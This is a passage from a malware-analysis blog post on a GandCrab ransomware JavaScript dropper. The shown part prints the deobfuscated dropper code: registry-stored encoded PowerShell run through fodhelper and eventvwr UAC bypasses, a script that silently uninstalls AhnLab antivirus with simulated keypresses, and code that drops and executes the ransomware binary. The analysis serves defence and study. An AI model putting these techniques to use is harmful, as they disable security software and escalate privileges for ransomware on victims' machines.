class="string">"tgydmilslvp.txt"</span>)) &#123;</span><br><span class="line">    decryptAndDrop(mvqwaqu, malScriptPath + <span class="string">'recjyzcz.js'</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      runShellCommand(<span class="string">'wscript.exe "'</span> + malScriptPath + <span class="string">'recjyzcz.js"'</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    decryptAndDrop(<span class="string">'727272'</span>, malScriptPath + <span class="string">'tgydmilslvp.txt'</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      runShellCommand(<span class="string">'wscript.exe "'</span> + WScript.ScriptFullName + <span class="string">'"'</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">    WScript.Quit();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>When the file <em>recjyzcz.js</em> is decrypted and dropped it look as below :</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> shellObject = WScript.CreateObject(<span class="string">"shell.application"</span>);</span><br><span class="line"><span class="keyword">var</span> wScriptObject = <span class="keyword">new</span> ActiveXObject(<span class="string">"WScript.Shell"</span>);</span><br><span class="line"><span class="keyword">var</span> mtvunslh = GetObject(<span class="string">"winmgmts:\\\\.\\root\\CIMV2"</span>);</span><br><span class="line"><span class="keyword">var</span> hewjay = mtvunslh.ExecQuery(<span class="string">"SELECT * FROM Win32_OperatingSystem"</span>, <span class="string">"WQL"</span>, <span class="number">0x10</span> | <span class="number">0x20</span>);</span><br><span class="line"><span class="keyword">var</span> yhqpykwg = <span class="keyword">new</span> Enumerator(hewjay);</span><br><span class="line"><span class="keyword">var</span> yjiofgrdfx = yhqpykwg.item();</span><br><span class="line"><span class="keyword">var</span> systemDirectoryPath = yjiofgrdfx.SystemDirectory;</span><br><span class="line"><span class="keyword">var</span> OSVersionStr = yjiofgrdfx.Version;</span><br><span class="line"><span class="keyword">var</span> OSVersion = OSVersionStr.split(<span class="string">"."</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// base64 encoded unicode string</span></span><br><span class="line"><span class="keyword">var</span> zrynfhnwsub = <span class="string">'QQBk...H0A'</span>;</span><br><span class="line"></span><br><span class="line">wScriptObject.RegWrite(<span class="string">"HKEY_CURRENT_USER\\Software\\capvzgf\\cazysa"</span>, zrynfhnwsub, <span class="string">"REG_SZ"</span>);</span><br><span class="line"><span class="comment">// long unicode encoded strings when decoded looks like below</span></span><br><span class="line"><span class="comment">// (Get-ItemProperty -path 'HKCU:\SOFTWARE\capvzgf').cazysa</span></span><br><span class="line"><span class="keyword">var</span> djziapwzi = systemDirectoryPath + <span class="string">'\\WindowsPowerShell\\v1.0\\powershell.exe -nologo -noprofile -ExecutionPolicy ByPass -w hidden -EncodedCommand WwB.....AA=='</span>;</span><br><span class="line"><span class="keyword">if</span> (OSVersion[<span class="number">0</span>] == <span class="string">'10'</span>) &#123;</span><br><span class="line">  wScriptObject.RegWrite(<span class="string">"HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\\"</span>,</span><br><span class="line">  djziapwzi,</span><br><span class="line">  <span class="string">"REG_SZ"</span>);</span><br><span class="line">  wScriptObject.RegWrite(<span class="string">"HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\\DelegateExecute"</span>,</span><br><span class="line">  <span class="string">""</span>, <span class="string">"REG_SZ"</span>);</span><br><span class="line">  shellObject.ShellExecute(<span class="string">"explorer.exe"</span>, <span class="string">'"'</span> + systemDirectoryPath + <span class="string">'\\fodhelper.exe"'</span>, <span class="string">""</span>, <span class="string">"open"</span>, <span class="number">0</span>);</span><br><span class="line">  WScript.sleep(<span class="number">5000</span>);</span><br><span class="line">  wScriptObject.RegDelete(<span class="string">"HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\\"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (OSVersion[<span class="number">0</span>] == <span class="string">'6'</span>) &#123;</span><br><span class="line">    wScriptObject.RegWrite(<span class="string">"HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\\"</span>,</span><br><span class="line">    djziapwzi, <span class="string">"REG_SZ"</span>);</span><br><span class="line">    shellObject.ShellExecute(<span class="string">"explorer.exe"</span>, <span class="string">'"'</span> + systemDirectoryPath + <span class="string">'\\eventvwr.exe"'</span>, <span class="string">""</span>, <span class="string">"open"</span>, <span class="number">0</span>);</span><br><span class="line">    WScript.sleep(<span class="number">5000</span>);</span><br><span class="line">    wScriptObject.RegDelete(<span class="string">"HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\\"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The above script follows the same pattern as previous scripts it writes a PowerShell script to registry key <strong>HKEY_CURRENT_USER\Software\capvzgf\cazysa</strong> and then use the same privilage escalation method as described in the previous section to execute that PowerShell script at high privilage.</p><p>The PowerShell script is base64 encoded unicode string, on decoding the script is as shown below.</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Add-Type</span> <span class="string">' c# code show in next section'</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a1</span>=(<span class="built_in">Get-Process</span> <span class="literal">-Name</span> V3Lite).path | <span class="built_in">Split-Path</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a2</span> = <span class="variable">$a1</span>+<span class="string">'\Uninst.exe'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>([<span class="type">System.IO.File</span>]::Exists(<span class="variable">$a2</span>))&#123;</span><br><span class="line">  <span class="variable">$a5</span> = <span class="variable">$ENV:UserProfile</span>+<span class="string">'\Desktop\install.exe'</span>;</span><br><span class="line">  <span class="variable">$a6</span> = <span class="string">"C:\Windows\System32\cmd.exe"</span>;</span><br><span class="line">  <span class="built_in">Copy-Item</span> <span class="variable">$a2</span> <span class="literal">-Destination</span> <span class="variable">$a5</span>;</span><br><span class="line">  <span class="variable">$a3</span> = <span class="string">'/c "runas /trustlevel:0x40000 ^"'</span>+<span class="variable">$a5</span>+<span class="string">' -Uninstall^" &amp; ^"%TEMP%\AhnUn000.tmp^" -UC"'</span>;</span><br><span class="line">  <span class="built_in">start-process</span> <span class="variable">$a6</span> <span class="variable">$a3</span> <span class="literal">-WindowStyle</span> <span class="keyword">Hidden</span>;</span><br><span class="line">  <span class="variable">$a7</span> = <span class="string">'/c "runas /trustlevel:0x40000 ^"%TEMP%\AhnUn000.tmp -UC^""'</span>;</span><br><span class="line">  <span class="built_in">Start-Sleep</span> <span class="literal">-seconds</span> <span class="number">5</span>;</span><br><span class="line">  <span class="built_in">start-process</span> <span class="variable">$a6</span> <span class="variable">$a7</span> <span class="literal">-WindowStyle</span> <span class="keyword">Hidden</span>;</span><br><span class="line">  <span class="variable">$a</span> = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">While</span> (<span class="variable">$a</span> <span class="operator">-le</span> <span class="number">5</span>) &#123;</span><br><span class="line">    <span class="built_in">Start-Sleep</span> <span class="literal">-s</span> <span class="number">1</span>;</span><br><span class="line">    <span class="variable">$a4</span> = <span class="built_in">Get-Process</span> <span class="string">"AhnUn000.tmp"</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a4</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span>([<span class="built_in">int</span>]<span class="variable">$a4</span>.MainWindowHandle <span class="operator">-eq</span> <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">Start-Sleep</span> <span class="literal">-seconds</span> <span class="number">1</span></span><br><span class="line">      &#125;</span><br><span class="line">      [<span class="type">WindowHelper</span>]::SendKeysMe(<span class="variable">$a4</span>.MainWindowHandle)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The above script run the following commands at elevated privilages :</p><ol><li>**C:\Windows\System32\cmd.exe /c “runas /trustlevel:0x40000 \Desktop\install.exe -Uninstall” &amp; “%TEMP%\AhnUn000.tmp” -UC **</li><li><strong>C:\Windows\System32\cmd.exe /c “runas /trustlevel:0x40000 %TEMP%\AhnUn000.tmp” -UC</strong></li></ol><p>What its doing is uninstalling the Ahnlab antivirus.</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.InteropServices;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">WindowHelper</span> &#123;</span><br><span class="line">    [<span class="meta">DllImport(<span class="meta-string">"user32.dll"</span>, SetLastError = true, CharSet = CharSet.Auto)</span>]</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">extern</span> <span class="keyword">bool</span> <span class="title">PostMessage</span>(<span class="params"> IntPtr hWnd,</span></span></span><br><span class="line"><span class="function"><span class="params">                                    <span class="keyword">uint</span> Msg,</span></span></span><br><span class="line"><span class="function"><span class="params">                                    IntPtr wParam,</span></span></span><br><span class="line"><span class="function"><span class="params">                                    IntPtr lParam</span>)</span>;</span><br><span class="line">    [<span class="meta">return : MarshalAs(UnmanagedType.Bool)</span>]</span><br><span class="line"></span><br><span class="line">    [<span class="meta">DllImport(<span class="meta-string">"user32.dll"</span>)</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="keyword">bool</span> <span class="title">ShowWindow</span>(<span class="params">IntPtr hWnd, Int32 nCmdShow</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> Int32 WM_KEYDOWN = <span class="number">0x0100</span>;</span><br><span class="line">    <span class="keyword">const</span> Int32 VK_RETURN = <span class="number">0x0D</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">SendKeysMe</span>(<span class="params"><span class="keyword">int</span> hWnd</span>)</span> &#123;</span><br><span class="line">        PostMessage(<span class="keyword">new</span> IntPtr(hWnd),</span><br><span class="line">                    WM_KEYDOWN,</span><br><span class="line">                    <span class="keyword">new</span> IntPtr(VK_RETURN),</span><br><span class="line">                    <span class="keyword">new</span> IntPtr(<span class="number">0</span>));</span><br><span class="line">        ShowWindow(<span class="keyword">new</span> IntPtr(hWnd),</span><br><span class="line">                    <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1><span id="drop-and-execute-gandcrab-binary">Drop and execute GandCrab binary</span></h1><p>Once the environment is set properly i.e. removing security products the javascript file drops and executes the malware binary leading to system encryption, code to drop binary is as shown below.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> stwnydqsuji = WScript.CreateObject(<span class="string">"shell.application"</span>);</span><br><span class="line"><span class="keyword">var</span> bewktojmagvc = <span class="keyword">new</span> ActiveXObject(<span class="string">'Scripting.FileSystemObject'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> xtaqukamdxzx = <span class="string">'0000....5D4'</span>;</span><br><span class="line"></span><br><span class="line">decryptAndDrop(xtaqukamdxzx, malScriptPath + <span class="string">'dsoyaltj.exe'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (bewktojmagvc.FileExists(malScriptPath + <span class="string">"dsoyaltj.exe"</span>)) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    stwnydqsuji.ShellExecute(<span class="string">'"'</span> + malScriptPath + <span class="string">"dsoyaltj.exe"</span> + <span class="string">'"'</span>, <span class="string">''</span>, <span class="string">""</span>, <span class="string">"open"</span>, <span class="number">1</span>);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><table><thead><tr><th>MD5</th><th>File</th></tr></thead><tbody><tr><td>595A31A4913951D3EB7211618AE75DEA</td><td>javascript dropper</td></tr><tr><td>95557A29DE4B70A25CE62A03472BE684</td><td>binary file</td></tr></tbody></table><p>source code of all the analysis can be found on this <a href="https://github.com/d3xt3rsl4b/gandcrab-javascript-dropper">link</a></p><h1><span id="references">References</span></h1><ol><li><a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-6">PowerShell Add-Type</a></li><li><a href="https://www.file.net/process/nissrv.exe.html">What is NisSrv.exe</a></li><li><a href="https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/">Window 10 UAC Bypass</a></li><li><a href="https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/">Window 7 and 8 UAC Bypass</a></li></ol></div><div class="article-tags size-small mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/Windows-Malware/">Windows Malware</a><a class="link-muted mr-2" rel="tag" href="/tags/javascript-obfuscation/">javascript obfuscation</a><a class="link-muted mr-2" rel="tag" href="/tags/GandCrab/">GandCrab</a></div></article></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2018/12/17/unpacking-grey-energy-malware/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">Unpacking Grey Energy malware (Service Application DLL)</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2018/10/10/setting-up-windows-7-for-kernel-debugging/"><span class="level-item">Setting up Windows 7 Machine for Kernel Debugging</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">Comments</h3><div id="disqus_thread"><noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div><script>var disqus_config=function(){this.page.url="https://www.taintedbits.com/2018/10/18/gandcrab-detail-analysis-of-js-delivery-payload/",this.page.identifier="2018/10/18/gandcrab-detail-analysis-of-js-delivery-payload/"};!function(){var a=document,t=a.createElement("script");t.src="//taintedbits.disqus.com/embed.js",t.setAttribute("data-timestamp",+new Date),(a.head||a.body).appendChild(t)}()</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen order-1 is-sticky"><div class="card widget" id="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list"><li><a class="is-flex" href="#"><span class="mr-2">1</span><span>Layer One obfuscated payload</span></a></li><li><a class="is-flex" href="#"><span class="mr-2">2</span><span>Killing Avast Antivirus</span></a></li><li><a class="is-flex" href="#"><span class="mr-2">3</span><span>Killing Windows Defender</span></a></li><li><a class="is-flex" href="#"><span class="mr-2">4</span><span>Kill Microsoft Network Realtime Inspection Service</span></a></li><li><a class="is-flex" href="#"><span class="mr-2">5</span><span>Kill Ahnlab Antivirus</span></a></li><li><a class="is-flex" href="#"><span class="mr-2">6</span><span>Drop and execute GandCrab binary</span></a></li><li><a class="is-flex" href="#"><span class="mr-2">7</span><span>References</span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><h3 class="menu-label">Recent</h3><article class="media"><div class="media-content size-small"><p><time datetime="2020-07-17T18:30:00.000Z">2020-07-18</time></p><p class="title is-6"><a class="link-muted" href="/2020/07/18/binary-exploitation-pwnable-tw-hacknote/">Binary Exploitation [pwnable.tw] - HackNote</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/CTF-Writeups/">CTF Writeups</a></p></div></article><article class="media"><div class="media-content size-small"><p><time datetime="2020-07-17T18:30:00.000Z">2020-07-18</time></p><p class="title is-6"><a class="link-muted" href="/2020/07/18/binary-exploitation-pwnable-tw-tcache-tear/">Binary Exploitation [pwnable.tw] - Tcache Tear</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/CTF-Writeups/">CTF Writeups</a></p></div></article><article class="media"><div class="media-content size-small"><p><time datetime="2020-07-11T18:30:00.000Z">2020-07-12</time></p><p class="title is-6"><a class="link-muted" href="/2020/07/12/binary-exploitation-pwnable-tw-caov/">Binary Exploitation [pwnable.tw] - CAOV</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/CTF-Writeups/">CTF Writeups</a></p></div></article><article class="media"><div class="media-content size-small"><p><time datetime="2020-07-10T18:30:00.000Z">2020-07-11</time></p><p class="title is-6"><a class="link-muted" href="/2020/07/11/binary-exploitation-pwnable-tw-spirited-away/">Binary Exploitation [pwnable.tw] - Spirited Away</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/CTF-Writeups/">CTF Writeups</a></p></div></article><article class="media"><div class="media-content size-small"><p><time datetime="2020-07-04T18:30:00.000Z">2020-07-05</time></p><p class="title is-6"><a class="link-muted" href="/2020/07/05/binary-exploitation-pwnable-tw-realloc/">Binary Exploitation [pwnable.tw] - Realloc</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/CTF-Writeups/">CTF Writeups</a></p></div></article></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Categories</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/categories/Brain-Logs/"><span class="level-start"><span class="level-item">Brain Logs</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/CTF-Writeups/"><span class="level-start"><span class="level-item">CTF Writeups</span></span><span class="level-end"><span class="level-item tag">14</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/Exploitation/"><span class="level-start"><span class="level-item">Exploitation</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/IOT/"><span class="level-start"><span class="level-item">IOT</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/Machine-Learning/"><span class="level-start"><span class="level-item">Machine Learning</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/Malware-Analysis/"><span class="level-start"><span class="level-item">Malware Analysis</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/NLP/"><span class="level-start"><span class="level-item">NLP</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/Reverse-Engineering/"><span class="level-start"><span class="level-item">Reverse Engineering</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/ACS712/"><span class="tag">ACS712</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Arduino/"><span class="tag">Arduino</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/CTF/"><span class="tag">CTF</span><span class="tag is-grey-lightest">14</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Chat-Bots/"><span class="tag">Chat Bots</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Classification/"><span class="tag">Classification</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Data-Wrangling/"><span class="tag">Data Wrangling</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Dev/"><span class="tag">Dev</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Dropper/"><span class="tag">Dropper</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ESP8266/"><span class="tag">ESP8266</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Editor/"><span class="tag">Editor</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Emacs/"><span class="tag">Emacs</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Exploitation/"><span class="tag">Exploitation</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/GandCrab/"><span class="tag">GandCrab</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Grey-Energy/"><span class="tag">Grey Energy</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Heap-Exploitation/"><span class="tag">Heap Exploitation</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Kernel-Debugging/"><span class="tag">Kernel Debugging</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Linux/"><span class="tag">Linux</span><span class="tag is-grey-lightest">15</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Linux-Malware/"><span class="tag">Linux Malware</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Malware-Analysis/"><span class="tag">Malware Analysis</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Python/"><span class="tag">Python</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ROP/"><span class="tag">ROP</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Regression/"><span class="tag">Regression</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Reverse-Engineering/"><span class="tag">Reverse Engineering</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Visualization/"><span class="tag">Visualization</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/WarGames/"><span class="tag">WarGames</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Windows-Malware/"><span class="tag">Windows Malware</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Windows-Reversing/"><span class="tag">Windows Reversing</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/glibc/"><span class="tag">glibc</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/javascript-obfuscation/"><span class="tag">javascript obfuscation</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pwnable/"><span class="tag">pwnable</span><span class="tag is-grey-lightest">14</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pwnable-kr/"><span class="tag">pwnable-kr</span><span class="tag is-grey-lightest">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pwnable-tw/"><span class="tag">pwnable-tw</span><span class="tag is-grey-lightest">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/radare2/"><span class="tag">radare2</span><span class="tag is-grey-lightest">4</span></a></div></div></div></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/images/logo-header.png" alt="D3xt3r&#039;s Laboratory" height="28"></a><p class="size-small"><span>&copy; 2020 D3xt3r</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by-nc-sa/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Subscribe" href="https://mailchi.mp/d744c1f04904/taintedbits"><i class="fa fa-envelope"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/0xd3xt3r"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script>moment.locale("en")</script><script>var IcarusThemeSettings={site:{url:"https://www.taintedbits.com",external_link:{enable:!0,exclude:[]}},article:{highlight:{clipboard:!0,fold:"unfolded"}}}</script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><div id="outdated"><h6>Your browser is out-of-date!</h6><p>Update your browser to view this website correctly.&amp;npsb;<a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update my browser now</a></p><p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">×</a></p></div><script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script><script>window.addEventListener("load",function(){outdatedBrowser({bgColor:"#f25648",color:"#ffffff",lowerThan:"object-fit"})})</script><a id="back-to-top" title="Back to Top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener("DOMContentLoaded",function(){loadInsight({contentUrl:"/content.json"},{hint:"Type something...",untitled:"(Untitled)",posts:"Posts",pages:"Pages",categories:"Categories",tags:"Tags"})})</script></body></html>